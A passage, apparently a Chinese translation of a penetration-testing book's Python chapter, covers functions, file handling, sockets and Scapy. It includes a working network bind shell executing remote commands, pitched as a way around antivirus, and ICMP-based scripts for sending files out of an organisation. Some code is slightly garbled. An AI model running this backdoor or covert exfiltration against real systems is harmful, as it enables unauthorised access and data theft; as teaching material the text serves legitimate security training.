  \     break\n\n   print str(i)\n\n   i = i + 1\n```\n\n这个 while 循环将永远运行，因为 1 始终为真。因此，我们必须确保有跳出循环的条件；它不会自行停止。我们的第一个\
  \ if 语句检查变量 `i` 是否在 1 到 9 之间；如果是，我们将给它加 5 并继续。continue 运算符表示：“停在这里，然后进入循环的下一次迭代。”尝试使用这个脚本，看看添加其他条件如何改变程序的流程。\n\
  \n### 函数\n\n到目前为止，我们编写的脚本都很小。当我们转向更大的程序，其中包含我们希望重用的代码段时，函数变得至关重要。函数为我们提供了逻辑上可重用的代码分组。函数以\
  \ def 语句开头，后跟函数名称和函数所需的参数列表。让我们看一个实际的例子。\n\n我们进行渗透测试的网站通常会主动告诉我们所有好东西的位置，无需我们询问。`robots.txt`\
  \ 文件是网站告诉搜索引擎不要索引哪些地方的地方。这些地方通常正是我们在寻找有趣内容时想要查看的地方。下面是一个函数，它将获取 robots 文件并返回我们不应该找到的路径：\n\
  \n```\ndef getDenies(site):\n\n   paths = []\n\n   # Create a new robot parser instance\
  \ and read the site’s robots file\n\n   robot = robotparser.RobotFileParser()\n\n\
  \   robot.set_url(\"http://\"+site+\"/robots.txt\")\n\n   robot.read()\n\n   # For\
  \ each entry, look at the rule lines and add the path to paths if\n    # disallowed\n\
  \n   for entry in robot.entries:\n\n     for line in entry.rulelines:\n\n      \
  \ not line.allowance and paths.append(line.path)\n\n   return set(paths)\n```\n\n\
  我们的函数 `getDenies` 接受一个参数：托管 `robots.txt` 文件的站点。这个参数是必需的，因为它没有默认值。我们可以通过添加赋值运算符和默认值来使其成为可选参数。这看起来像\
  \ `site = 'localhost'` 而不是当前的 `site` 变量。一旦我们有了站点，我们就创建一个新的 `RobotFileParser` 实例，并使用\
  \ `set_url` 方法将 URL 设置为 `robots.txt` 文件的完整路径。我们使用 `read` 方法将信息读入解析器，解析器会为我们处理所有数据的解析。Python\
  \ 使用缩进来确定上下文，因此当缩进返回到与函数语句相同的缩进时，我们就知道函数结束了。\n\n\n\n\n现在，我们已经将解析后的数据存储在 `parser`\
  \ 对象中，接下来将直接访问它收集的条目分组。每个条目分组由规则行组成。我们将使用嵌套的 for 循环来获取每条规则，然后检查它是“允许”还是“拒绝”。我们通过检查\
  \ `allowance` 变量来实现这一点，如果它为假，则将路径添加到 `paths` 列表中。遍历完所有规则行后，我们使用 `set` 函数将列表中的所有重复项合并为一个唯一元素的列表。最后，`return`\
  \ 函数将该信息返回给调用代码。但并非所有函数都必须有返回值。\n\n现在函数已经完成，我们可以生成使程序变得有用的其余代码，并进行测试：\n\n```\n#!/usr/lib/python\n\
  \nimport robotparser\n\nsites = [’[www.google.com](http://www.google.com)’,’[www.offensive-security.com](http://www.offensive-security.com)’,’[www.yahoo.com](http://www.yahoo.com)’]\n\
  \ndef getDenies(site):\n\n   paths = []\n\n   # 创建一个新的 robot 解析器实例，并读取站点的 robots\
  \ 文件\n\n   robot = robotparser.RobotFileParser()\n\n   robot.set_url(\"http://\"\
  +site+\"/robots.txt\")\n\n   robot.read()\n\n   # 对于每个条目，查看规则行，如果被禁止则将路径添加到 paths\
  \ 中\n\n   for entry in robot.entries:\n\n     for line in entry.rulelines:\n\n       not\
  \ line.allowance and paths.append(line.path)\n\n   return set(paths)\n\nfor site\
  \ in sites:\n\n   print \"Denies for \" + site\n\n   print \"\\t\" + \"\\n\\t\"\
  .join(getDenies(site))\n```\n\n## 文件操作\n\n虽然其他编程语言（如 Perl）在文件解析方面表现出色，但有时在 Python\
  \ 中进行文件操作会更方便。在本节中，我们将介绍使用 Python 读写文件的基础知识。之前我们在创建 `password.py` 时已经使用过文件读取，当时使用了\
  \ `file open` 命令并将文件指定为只读。我们还需要了解其他几种模式。\n\n除了 `r` 或 `read` 模式外，还有用于写入的 `w` 模式和用于追加的\
  \ `a` 模式。两个重要的修饰符是 `+` 和 `b`。`+` 表示除了你选择的模式外，文件还将是可写的。通常用于 `r+`，表示你想保持文件完整但进行修改。`w`\
  \ 模式在打开文件时会用空白文件覆盖原文件名。`b` 标志在 UNIX 中不使用，但在 Windows 模式下表示该文件应为二进制文件。要在 Windows 中读写二进制文件，你会使用\
  \ `r+b`。\n\n文件打开后，`read` 和 `write` 函数开始发挥作用。主要有三种读取方法。`read` 方法从文件中读取。如果没有向 `read`\
  \ 传递参数，它将读取整个文件并将该信息作为字符串返回。如果你的文件很大，这可能会成为问题。因此，你可以指定要读取的字节数，`read` 将只返回该数量的字节，如果到达文件末尾则返回空字符串。`readline`\
  \ 方法将一整行作为字符串返回，而 `readlines` 函数将整个文件作为字符串列表返回。\n\n读取文件有几种选择，但写入文件只有一种选择：`write`\
  \ 方法。`write` 方法接受一个参数：一个字符串。它将字符串写入当前文件位置。`write` 方法返回 `None`。因此，我们唯一能知道它没有写入完整字符串的方式是它抛出异常。\n\
  \n我们可能使用的最后两个方法是 `seek` 和 `tell`。它们在你处理二进制文件时尤其重要。`tell` 方法告诉你当前在文件中的位置，而 `seek`\
  \ 函数允许你根据当前位置在文件中向前或向后移动。`seek` 方法接受两个参数：要前进的偏移量和相对位置。位置值为 0 表示“从文件开头开始”；1 表示“从当前位置开始”；2\
  \ 表示“从文件末尾开始”。\n\n以下是这些方法的示例。修改此代码以测试所有差异。\n\n```\n#!/usr/bin/python\n\n# 以写入模式打开文件\n\
  \nf = open(\"test.txt\",\"w\")\n\nf.write(\"Hello world\\n\")\n\nf.close()\n\n#\
  \ 以追加模式打开文件\n\nf = open(\"test.txt\",\"a\")\n\nf.write(\"This is the end\\n\")\n\
  \nf.close()\n\n# 以读取和修改模式打开文件\n\nf = open(\"test.txt\",\"r+\")\n\n# 打印文件内容\n\nprint\
  \ \"Current contents are:\\n\" + f.read()\n\n# 移动到文件末尾并追加\n\nf.seek(0,2)\n\nprint\
  \ \"Starting file length is %d\" % f.tell()\n\nf.write(\"This is the new end!\\\
  n\")\n\nprint \"End file length is %d\" % f.tell()\n\n# 回到文件开头进行读取\n\nf.seek(0,0)\n\
  \nprint \"\\nNew contents are:\\n\" + f.read()\n\nf.close()\n```\n\n### 异常处理\n\n\
  有时糟糕的事情会发生在好的脚本上。异常处理允许我们处理这些问题，要么恢复，要么呈现比堆栈跟踪更友好的错误消息——当出现意外错误时，堆栈跟踪会显示出来。异常处理的两个核心元素是\
  \ `try` 和 `except` 关键字。`try` 代码块是我们尝试执行的代码。如果 `try` 块中发生错误，我们有一个 `except` 语句来处理它。异常处理块中可能出现的另外两个元素是\
  \ `else` 和 `finally`。`else` 关键字用于在没有引发异常时应运行的代码，而 `finally` 关键字用于无论是否发生错误都应运行的代码。\n\
  \n让我们看一个实际示例。当我们打开文件时，有时文件可能不存在。我们可以通过多种方式解决这个问题，但由于这是异常处理部分，我们可能应该尝试一下。\n\n```\n\
  try:\n\n   f = open(\"/tmp/nessus.nbe\")\n\n   print f.read()\n\n   f.close()\n\n\
  except IOError:\n\n   print \"Error occurred opening file\"\n\nexcept :\n\n   print\
  \ \"Unknown error occurred\"\n\nelse :\n\n   print \"File contents successfully\
  \ read\"\n\nfinally:\n\n   print \"Thanks for playing!\"\n```\n\n这段示例代码包含了所有条件。在\
  \ `try` 块中，我们尝试打开一个文件并打印内容。如果文件打开失败，代码会引发 `IOError` 异常，我们通过 `except` 捕获它。如果发生了与我们预期不同类型的错误，第二个\
  \ `except` 语句会捕获它并打印不同的错误消息。如果没有错误，则打印成功消息。无论 `try` 块中发生了什么，`finally` 语句都会执行。\n\n\
  尝试创建文件，然后删除文件，观察差异：\n\n```\n# 测试我们的异常处理代码\n$ touch /tmp/nessus.nbe\n$ python exception.py\n\
  File contents successfully read\nThanks for playing!\n# 没有文件时，我们应该得到异常\n$ rm /tmp/nessus.nbe\n\
  $ python exception.py\nError occurred opening file\nThanks for playing!\n# 没有异常处理时\n\
  $ python withoutexception.py\nTraceback (most recent call last):\n   File \"a.py\"\
  , line 3, in <module>\n     f \" open(\"/tmp/nessus.nbe\")\nIOError: [Errno 2] No\
  \ such file or directory: ’/tmp/nessus.nbe’\n```\n\n## 网络通信\n\n当我们进行网络渗透测试并需要自定义脚本时，Python\
  \ 是一种常见的解决方案。网络库非常丰富，可用于构建漏洞利用的基本套接字操作路径也很容易使用。这里我们将分两个部分探讨网络概念：客户端通信和服务器通信。\n\n\
  ### 客户端通信\n\n客户端通信将涵盖我们使用套接字的大部分内容。我们首先关注基本套接字的使用。它们在构建网络漏洞利用、执行原始套接字函数或需要快速完成某些网络任务时会派上用场。对于更复杂的网络协议，使用能够处理协议复杂部分的\
  \ Python 模块是合理的。\n\n连接到主机涉及两个操作：创建套接字，以及将该套接字连接到远程主机。让我们看看代码，然后分析每个操作的含义：\n\n\n\n\
  \n\n# 构建一个套接字并连接到 [google.com](http://google.com)\n\n```python\ns = socket.socket(socket.AF_INET,\
  \ socket.SOCK_STREAM)\ns.connect((\"www.google.com\", 80))\n```\n\n要构建一个套接字，我们需要指定两个选项：套接字族和套接字类型。这里的套接字族是\
  \ `AF_INET`，即 IPv4 套接字。其他族包括用于 IPv6 的 `AF_INET6`、用于本地套接字的 `AF_UNIX` 以及用于原始套接字的 `AF_RAW`。第二个选项是套接字类型，这里使用的是\
  \ `SOCK_STREAM` 套接字。`SOCK_STREAM` 套接字是传输控制协议（TCP）风格的套接字，但我们也可以选择使用 `SOCK_DGRAM`\
  \ 用于用户数据报协议（UDP）风格的套接字，或者 `SOCK_RAW` 用于原始套接字。\n\n接下来，我们将套接字连接到远程主机。我们必须提供主机名或 IP\
  \ 地址以及我们希望连接的端口。`connect` 语句会打开到远程主机的连接。现在我们可以对该套接字进行读写操作。让我们看一些从远程主机获取网页的基本代码。\n\
  \n## 发送一个基本的 HTTP 请求\n\n```python\ns.send(\"GET / HTTP/1.0\\nHost: www.google.com\\\
  n\\n\")\npage = \"\"\nwhile 1:\n    data = s.recv(1024)\n    if data == \"\":\n\
  \        break\n    page = page + data\n```\n\n套接字的 `send` 方法接受一个参数：你想要发送的字符串。这里，我们向\
  \ Google 发送一个 Web 请求。我们将 `page` 变量初始化为空字符串。最后，我们创建并使用一个循环来接收数据。我们需要循环是因为 `recv`\
  \ 最多会读取指定参数大小的数据——这里是 1024 字节。我们希望持续读取直到获取所有数据。当没有更多数据可读时，`recv` 方法会返回一个空字符串，因此我们检查这个条件来跳出\
  \ `while` 循环。一旦我们获取了数据，就可以关闭套接字并打印数据。让我们看看完整的脚本：\n\n```python\n#!/usr/bin/python\n\
  import socket\n\n# 构建一个套接字并连接到 google.com\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
  s.connect((\"www.google.com\", 80))\n\n# 发送一个基本的 HTTP 请求\ns.send(\"GET / HTTP/1.0\\\
  nHost: www.google.com\\n\\n\")\npage = \"\"\n\n# 当数据仍在返回时，追加到我们的 page 变量\nwhile\
  \ 1:\n    data = s.recv(1024)\n    if data == \"\":\n        break\n    page = page\
  \ + data\n\n# 关闭套接字并打印结果\ns.close()\nprint page\n```\n\n这个脚本可以处理 IPv4 套接字。但如果我们想使用\
  \ IPv6，或者事先不知道我们将拥有哪种类型的 IP 地址呢？我们可以利用其他套接字模块功能来搜索可用的 IP 地址，它会帮我们解决部分问题。\n\n## 构建一个套接字并连接到\
  \ [google.com](http://google.com)\n\n```python\naf, type, proto, name, conn = socket.getaddrinfo(\"\
  www.google.com\", 80, 0, 0, socket.SOL_TCP)[0]\ns = socket.socket(af, type, proto)\n\
  s.connect(conn)\n```\n\n通过使用 `getaddrinfo` 函数，我们可以指定主机名、端口、族、套接字类型和协议，它会返回我们所需的所有信息。这里，我们传入了主机名、Web\
  \ 服务器端口 80、TCP 协议，并将族和套接字类型设为 0。这样它就能自动为我们确定这些参数。该函数返回一个数组，包含可能的 IP 地址以及这些 IP 地址的套接字和族类型。这里我们只想要列表中的第一个。我们将返回的信息赋值给\
  \ `af`、`type`、`proto`、`name` 和 `conn` 变量，其中 `conn` 是一个包含 IP 和端口的元组，可用于我们的 `connect`\
  \ 语句。\n\n我们使用返回的 `af`、`type` 和 `proto` 变量来创建新的套接字，然后使用从 `getaddrinfo` 获取的连接信息连接到主机。现在，只要我们的机器支持\
  \ IPv4 和 IPv6，无论主机拥有哪种类型的 IP 地址，我们的代码都能连接到它。测试最终代码，并验证信息是否与之前的示例相同：\n\n```python\n\
  import socket\n\n# 构建一个套接字并连接到 google.com\naf, type, proto, name, conn = socket.getaddrinfo(\"\
  www.google.com\", 80, 0, 0, socket.SOL_TCP)[0]\ns = socket.socket(af, type, proto)\n\
  s.connect(conn)\n\n# 发送一个基本的 HTTP 请求\ns.send(\"GET / HTTP/1.0\\nHost: www.google.com\\\
  n\\n\")\npage = \"\"\n\n# 当数据仍在返回时，追加到我们的 page 变量\nwhile 1:\n    data = s.recv(1024)\n\
  \    if data == \"\":\n        break\n    page = page + data\n\n# 关闭套接字并打印结果\ns.close()\n\
  print page\n```\n\n### 服务器通信\n\n服务器通信比客户端通信更复杂。要接受传入连接，我们必须创建一个套接字，将其绑定到主机，然后监听连接。让我们看一个示例。\n\
  \n```python\nimport socket\n\n# 创建一个套接字，然后将套接字绑定到所有地址的 8080 端口\ns = socket.socket(socket.AF_INET,\
  \ socket.SOCK_STREAM)\ns.bind(('', 8080))\n\n# 监听传入连接\ns.listen(1)\n\n# 接受新连接，打印\
  \ \"RANDOM DATA\" 然后关闭套接字\nwhile 1:\n    conn, addr = s.accept()\n    print 'New\
  \ connection from ', addr\n    conn.send(\"RANDOM DATA\\n\")\n    conn.close()\n\
  \ns.close()\n```\n\n我们创建了一个用于 TCP 连接的套接字。然后使用套接字的 `bind` 方法将套接字绑定到所有接口的 8080 端口。如果我们只想监听回环\
  \ IP，可以在 `bind` 的第一个参数中使用 `127.0.0.1`，而不是示例代码中的空字符串。接下来，我们创建一个无限循环来接受传入连接。`accept`\
  \ 方法返回两个东西：连接到我们服务器的套接字和远程主机的地址。我们打印一条消息表示有新连接，然后向套接字发送一条消息并关闭它。\n\n虽然我们现在有了一个基本的服务器，但可能还有其他事情要做。如果我们要与客户端交互，输入可能会有暂停。此外，我们可能希望同时处理多个传入连接。为了实现这一点并使脚本更健壮，我们可以构建一个网络\
  \ shell 添加到工具包中。这个 shell 可以通过 `Netcat` 访问。我们可以向它发送命令，输出将返回给我们。通常有更简单的方法来实现这一点，但在传统工具被防病毒软件或基于主机的入侵防御系统（HIPS）阻止的情况下，这是一个不错的选择。那么让我们看看更健壮的代码。\n\
  \n```python\n# 创建并绑定套接字\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\
  s.bind(('', 8080))\n\n# 监听最多 10 个连接\ns.listen(10)\ninput = [s]\n```\n\n最初，我们的代码看起来类似。但我们修改了\
  \ `listen` 方法，通过传入参数 10 来同时处理 10 个套接字。我们还创建了一个名为 `input` 的新变量，其中监听套接字作为列表元素给出。\n\
  \n```python\nwhile 1:\n    # 检查等待读取的套接字\n    reader, output, exceptions = select.select(input,\
  \ [], [])\n```\n\n我们的下一段代码利用了 `select` 模块的 `select` 方法。这个模块由冗余部门提供。`select` 方法接受三个参数：要检查读取的套接字列表、要检查写入的套接字列表以及要检查错误的套接字列表。由于在这个练习中我们只检查读取的套接字，我们传入输入套接字列表，其余选项传入空列表。`select`\
  \ 方法返回三个列表：等待读取、写入和错误的列表。\n\n```python\nfor sock in reader:\n    # 如果套接字是我们的监听器，则接受新连接\n\
  \    if sock == s:\n        c, addr = s.accept()\n        print \"New connection\
  \ from \", addr\n        input.append(c)\n```\n\n\n\n\n我们检查读取器数组中的每个套接字。如果该套接字与监听套接字相同，说明有新的连接。我们接受该连接，打印一条确认新连接的消息，然后将该连接追加到输入列表中，以便在\
  \ `select` 语句中检查其输入。这样我们就能知道客户端何时输入了新数据。\n\n否则，它就是一条待执行的命令：\n\n```\nelse:\n   command\
  \ = sock.recv(1024)\n   if command:\n     shell = command.rstrip().split(\" \")\n\
  \     try:\n       out = subprocess.Popen(shell,stdout=subprocess.PIPE).communicate()[0]\n\
  \     except:\n       out = \"Command failed\\n\"\n       sock.send(out)\n     else:\n\
  \       sock.close()\n       input.remove(sock)\n```\n\n如果该套接字与监听套接字不同，说明有客户端向我们发送了信息。我们可以将该信息读入一个名为\
  \ `command` 的字符串。如果没有数据等待，说明套接字已关闭，我们需要关闭它。如果有数据等待，我们需要清理数据以便执行。首先，我们去除末尾的空白字符，然后将其拆分为单独的参数，传递给\
  \ shell。我们的网络 shell 只支持命令，因此某些操作（如 `cd` 切换目录）可能无法工作。由于我们知道某些命令可能会失败，因此将进程创建代码包裹在错误处理中，以免程序崩溃。\n\
  \n接下来，我们执行命令。使用 `Popen`（进程打开的缩写），我们利用客户端传递的参数创建一个进程，并将输出重定向到管道。`communicate` 函数会与程序交互并返回一个输出列表。我们想要将该列表的第一个元素发送回客户端，因此使用\
  \ `communicate` 方法输出的第一个元素。然后，我们将输出发送回客户端，并返回循环，等待更多输入。\n\n现在，我们应该拥有一个可用的网络 shell。\n\
  \n```\n#!/usr/bin/python\nimport socket,select,os,subprocess\n\n# 创建并绑定套接字\ns =\
  \ socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((\", 8080))\n\n# 监听最多\
  \ 10 个连接\ns.listen(10)\ninput = [s]\n\nwhile 1:\n   # 检查是否有套接字等待读取\n   reader,output,exceptions\
  \ = select.select(input,[],[])\n   for sock in reader:\n       # 如果套接字是监听套接字，则接受新连接\n\
  \       if sock == s:\n         c,addr = s.accept()\n         print \"New connection\
  \ from \" , addr\n         input.append(c)\n       # 否则，它是待执行的命令\n       else:\n\
  \         command = sock.recv(1024)\n         if command:\n           shell = command.rstrip().split(\"\
  \ \")\n           try:\n             out = subprocess.Popen(shell,stdout=subprocess.PIPE).communicate()[0]\n\
  \           except:\n             out = \"Command failed\\n\"\n           sock.send(out)\n\
  \         else:\n           sock.close()\n           input.remove(sock)\ns.close()\n\
  ```\n\n### Scapy\n\nScapy 模块在 Python 框架内提供了高级数据包操作功能。它允许我们在开放系统互连（OSI）栈的每一层操作和处理数据包。没错，Scapy\
  \ *确实*听起来很厉害。但学习曲线是存在的。首先，我们将查看 Scapy 交互式 shell，以便在后续使用 Scapy 编写脚本时更加熟悉。我们将构建数据包来学习如何操作交互式\
  \ shell，然后编写脚本来处理两个渗透测试问题：通过互联网控制消息协议（ICMP）传输数据以及处理嗅探到的数据。\n\n**注意**\n\n我们只是浅尝 Scapy\
  \ 的可能性。Scapy 的主页位于 [www.secdev.org/projects/scapy/](http://www.secdev.org/projects/scapy/)。在这里，你可以找到关于实时培训机会和文档的信息，并下载最新版本的\
  \ Scapy。\n\n要执行交互式 shell，请在 BackTrack shell 窗口中输入 `scapy`。可能会出现一些警告消息。最后，我们会看到 `Welcome\
  \ to Scapy` 以及熟悉的 Python 提示符。现在我们可以开始工作了。从哪里开始呢？要查看 Scapy 可以创建的数据包类型，输入 `ls()` 并按\
  \ **Enter**。这将列出你可以使用该框架创建的每种数据包类型的完整列表。让我们通过交互式 shell 来了解一些基本的数据包创建：\n\n```\nroot@bt:~#\
  \ scapy\nINFO: Can’t import PyX. Won’t be able to use psdump() or pdfdump().\nWARNING:\
  \ No route found for IPv6 destination :: (no default route?)\nWelcome to Scapy (2.1.0)\n\
  >>> myip = IP()\n>>> myip\n<IP |>\n>>> myip.default_fields\n{’frag’: 0, ’src’: None,\
  \ ’proto’: 0, ’tos’: 0, ’dst’: ’127.0.0.1’, ’chksum’: None, ’len’: None, ’options’:\
  \ [], ’version’: 4, ’flags’: 0, ’ihl’: None, ’ttl’: 64, ’id’: 1}\n```\n\n如前所述，这里有几个错误。一个说我们无法创建\
  \ PDF 或 PostScript 文件，另一个说我们没有 IPv6 地址。这两个错误在本例中都不影响我们。这里我们使用 `IP()` 构造函数创建一个 IP\
  \ 数据包，并将其赋值给 `myip` 变量。通过输入变量名，我们可以显示数据包中设置的内容。目前它是空的，这意味着数据包使用了默认值。要查看默认值，我们使用\
  \ `myip` 数据包的 `default_fields` 方法。\n\n现在，我们想要创建并发送一个基本的 ping 数据包。我们需要填写 IP 信息并创建一个\
  \ ICMP 数据包。让我们研究一下这个过程：\n\n```\n>>> ICMP().default_fields\n{’gw’: ’0.0.0.0’, ’code’:\
  \ 0, ’ts_ori’: 67344847, ’addr_mask’: ’0.0.0.0’, ’seq’: 0, ’ptr’: 0, ’unused’: 0,\
  \ ’ts_rx’: 67344847, ’chksum’: None, ’reserved’: 0, ’ts_tx’: 67344847, ’type’: 8,\
  \ ’id’: 0}\n>>> myicmp = IP(dst=\"192.168.1.1\")/ICMP(type=\"echo-request\")\n>>>\
  \ myicmp\n<IP frag=0 proto=icmp dst=192.168.1.1 |<ICMP type=echo-request |>>\n>>>\
  \ ans = sr1(myicmp)\nBegin emission:\n.^∗Finished to send 1 packets.\nReceived 2\
  \ packets, got 1 answers, remaining 0 packets\n>>> ans\n<IP version=4L ihl=5L tos=0x0\
  \ len=28 id=31204 flags= frag=0L ttl=64 proto=icmp chksum=0x7d42 src=192.168.1.1\
  \ dst=192.168.1.105 options=[] |<ICMP type=echo-reply code=0 chksum=0xffff id=0x0\
  \ seq=0x0 |<Padding load=’\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\
  x00\\x00\\x00\\x00\\x00\\x00\\x00’ |>>>\n```\n\n首先，我们需要知道 ICMP 层有哪些字段，因此我们调用 `default_fields`\
  \ 方法。现在我们知道 IP 和 ICMP 需要哪些字段，我们可以通过在层类型的构造函数中指定所需的值来创建包含两个层的数据包。在本例中，我们 ping 网关（`192.168.1.1`），并希望使用\
  \ echo-request ICMP 数据包，以便网关向我们发送响应。我们使用斜杠符号创建数据包：每个层由 `/` 符号分隔。为了验证数据包是否正确组装，我们打印数据包，看到\
  \ IP 和 ICMP 层看起来都正确。接下来，我们需要发送数据包。使用 `sr1` 方法，我们告诉 Scapy 发送数据包，并且它只接收一个应答。如果我们期望收到多个应答，则会使用\
  \ `sr` 函数。`sr1` 函数返回响应数据包。查看我们的应答，我们可以看到 IP 层、ICMP 结构以及数据包有填充。我们可能希望访问应答数据包中的特定信息：\n\
  \n```\n>>> ans\n<IP version=4L ihl=5L tos=0x0 len=28 id=31204 flags= frag=0L ttl=64\
  \ proto=icmp chksum=0x7d42 src=192.168.1.1 dst=192.168.1.105 options=[] |<ICMP type=echo-reply\
  \ code=0 chksum=0xffff id=0x0 seq=0x0 |<Padding load=’\\x00\\x00\\x00\\x00\\x00\\\
  x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00’ |>>>\n>>> ans[’IP’].src\n\
  ’192.168.1.1’\n>>> ans[’IP’].dst\n’192.168.1.105’\n>>> ans[’ICMP’].type\n0\n>>>\
  \ ans.show()\n###[ IP ]###\n   version= 4L\n   ihl= 5L\n   tos= 0x0\n   len= 28\n\
  \   id= 31204\n   flags=\n   frag= 0L\n   ttl= 64\n   proto= icmp\n   chksum= 0x7d42\n\
  \   src= 192.168.1.1\n   dst= 192.168.1.105\n   \\options\\\n###[ ICMP ]###\n  \
  \   type= echo-reply\n     code= 0\n```\n\n\n\n\n```\n     chksum= 0xffff\n\n     id=\
  \ 0x0\n\n     seq= 0x0\n\n###[ Padding ]###\n\n        load= ’\\x00\\x00\\x00\\\
  x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00’\n```\n\
  \n我们看到应答数据包中的所有信息，但未来我们需要知道如何通过编程方式从数据包中提取数据。我们可以像访问字典一样访问数据包的每一层：通过将层作为数组索引指定给我们的应答数据包。我们使用点（.）表示法访问层中每个字段的值，以表明它们是类的元素。有时，我们希望以更易读的格式查看整个结构。`show`\
  \ 方法会分解每一层并显示所有已设置的值。\n\n现在我们已经掌握了创建数据包并通过 `Scapy` 交互式 shell 与之交互的基础知识，接下来让我们将其付诸实践，构建一个脚本，允许我们使用\
  \ `ICMP` `echo-replies` 将数据发送到组织外部。如果组织的大部分端口都被封锁，但允许 `ICMP` 数据包通过，那么这种脚本可能会很有用。\n\
  \n```\nimport sys\n\nfrom scapy.all import ^∗\n\nconf.verb = 0\n\nf = open(sys.argv[1])\n\
  \ndata = f.read()\n\nf.close()\n```\n\n要导入 Scapy 代码，我们使用 `scapy.all` 模块。这种导入变体表示从该模块导入所有内容。这将使我们能够完全访问\
  \ `Scapy`。\n\n注意\n\n那么，为什么我们不直接导入 `scapy.all` 呢？请注意，当我们使用 `sys` 中的方法时，必须使用 `sys.method`\
  \ 来调用它们。而我们用于导入 `scapy.all` 的语法，则无需使用 `scapy.all.method` 来使用模块中的组件。\n\n然而，通过导入 Scapy\
  \ 框架的所有内容以便轻松访问，我们的程序会占用更多内存。随着对 Scapy 的熟悉，可以将导入列表缩减为仅包含所需的函数和类。\n\n我们将详细输出级别设置为零，这样在发送代码时就不会得到调试输出。我们将使用命令行向脚本传递参数。我们将在命令行中传递两个内容：要发送的文件以及要将文件发送到的主机。我们打开第一个选项，即要发送的文件，并将其读入\
  \ `data`。\n\n```\nhost = sys.argv[2]\n\nprint \"Data size is %d \" % len(data)\n\
  \ni = 0\n\nwhile i < len(data):\n\n   pack = IP(dst=host)/ICMP(type=\"echo-reply\"\
  )/data[i:i+32]\n\n   send(pack)\n\n   i = i + 32\n```\n\n我们的主机是第二个传递的参数，因此我们将其赋值给\
  \ `host` 变量。数据长度很重要。当我们在另一端嗅探数据时，需要知道预期接收多少个数据包。我们将以 32 字节的块进行发送，因此数据包数量将是文件大小除以\
  \ 32，并向上取整到最接近的整数。在本例中，我们将发送一个大小为 22,076 字节的 Netcat 文件。因为 22,076 / 32 = 689.87，所以我们将向上取整为\
  \ 690 个预期发送的数据包。我们将迭代器设置为 0，当迭代器小于数据大小时，我们创建一个新的 `ICMP` 数据包，其有效载荷为文件的下 32 个字节。由于我们使用的是\
  \ `ICMP` `echo-reply` 数据包，因此不会有任何返回信息。等待是没有意义的。所以我们使用 `send` 函数发送数据包。这会将数据包放到线路上，并且不等待任何返回信息。我们将迭代器增加\
  \ 32，以便下一次迭代获取字符串的下一个字节组。\n\n现在我们可以通过 ICMP 发送文件了。耶！我们可能应该研究一种方法，将这些数据从网络中取回，这样我们就不会白费功夫。Scapy\
  \ 具有嗅探功能，在这种情况下会很适用。我们的代码将以非常相似的方式开始：\n\n```\nimport sys\n\nfrom scapy.all import\
  \ ^∗\n\nconf.verb = 0\n\nf = open(sys.argv[1],\"w\")\n\nhost = sys.argv[2]\n\ncount\
  \ = int(sys.argv[3])\n```\n\n这次，我们以写入模式打开第一个参数（文件名）。我们将监听的主机和预期接收的数据包数量赋值给变量。接下来我们需要嗅探数据包：\n\
  \n```\nfilter = \"icmp and host \" + host\n\nprint \"sniffing with filter (%s) for\
  \ %d bytes\" % (filter,int(count))\n\npackets = sniff(count,filter=filter)\n\nfor\
  \ p in packets:\n\n   f.write(p[’Raw’].load)\n```\n\n我们首先构建一个过滤器。我们只想要发往我们主机的 `ICMP`\
  \ 数据包。我们创建一条状态消息，告知嗅探器已准备好接收数据。我们将 `sniff` 收集到的数据包放入一个名为 `packets` 的列表中。嗅探的两个选项是要捕获的数据包数量和要使用的嗅探过滤器。因为我们不希望\
  \ `sniff` 永远监听下去，所以我们给它一个固定的数据包数量。否则，如果需要，我们可以使用 `Ctrl + c` 来中断。一旦我们有了数据包，我们只对有效载荷感兴趣，它保存在\
  \ `Raw` 层的 `load` 变量中。当我们将其写入文件时，我们就成功通过 ICMP 传输了测试文件。让我们查看代码，然后逐步完成文件传输的过程：\n\n\
  客户端：\n\n```\nimport sys\n\nfrom scapy.all import ^∗\n\nconf.verb = 0\n\nf = open(sys.argv[1])\n\
  \ndata = f.read()\n\nf.close()\n\nhost = sys.argv[2]\n\nprint \"Data size is %d\
  \ \" % len(data)\n\ni = 0\n\nwhile i < len(data):\n\n   pack = IP(dst=host)/ICMP(type=\"\
  echo-reply\")/data[i:i+32]\n\n   send(pack)\n\n   i = i + 32\n\nprint \"Data sent\"\
  \n```\n\n服务端：\n\n```\n#!/usr/bin/python\n\nimport sys\n\nfrom scapy.all import ^∗\n\
  \nconf.verb = 0\n\nf = open(sys.argv[1],\"w\")\n\nhost = sys.argv[2]\n\ncount =\
  \ int(sys.argv[3])\n\nfilter = \"icmp and host \" + host\n\nprint \"sniffing with\
  \ filter (%s) for %d bytes\" % (filter,int(count))\n\npackets = sniff(count,filter=filter)\n\
  \nfor p in packets:\n\n   f.write(p[’Raw’].load)\n\nf.close()\n\nprint \"Data Received\"\
  \n```\n\n我们将这些脚本分别命名为 `sendICMP.py` 和 `receiveICMP.py`。我们要传输到系统的文件是 Netcat 二进制文件。该文件是\
  \ `/bin/nc.traditional`，大小为 22,076 字节。让我们确定将使用的数据包数量：\n\n```\nroot@bt:~# ls -l /bin/nc.traditional\n\
  \n-rwxr-xr-x 1 root root 22076 Jun 21 2008 /bin/nc.traditional\n\nroot@bt:~# python\
  \ -c ’print 22076.00/32.00\n\n689.875\n```\n\nPython 也是一个方便的计算器。我们看到文件需要 689.8 个数据包来发送。因此我们将该数字向上取整为\
  \ 690，并设置嗅探器来捕获我们的文件：\n\n```\nroot@bt:~# python receiveICMP.py mync 192.168.1.1\
  \ 690\n\nWARNING: No route found for IPv6 destination :: (no default route?)\n\n\
  sniffing with filter (icmp and host 192.168.1.1) for 690 bytes\n```\n\n我们的嗅探器现在正在监听发往\
  \ 192.168.1.1 的数据包，并将接收 690 个数据包到 `mync` 文件中。我们看到所有参数都已正确处理，嗅探器正在等待输入。现在发送我们的文件：\n\
  \n```\nroot@bt:~# python sendICMP.py /bin/nc.traditional 192.168.1.1\n\nWARNING:\
  \ No route found for IPv6 destination :: (no default route?)\n\nData size is 22076\n\
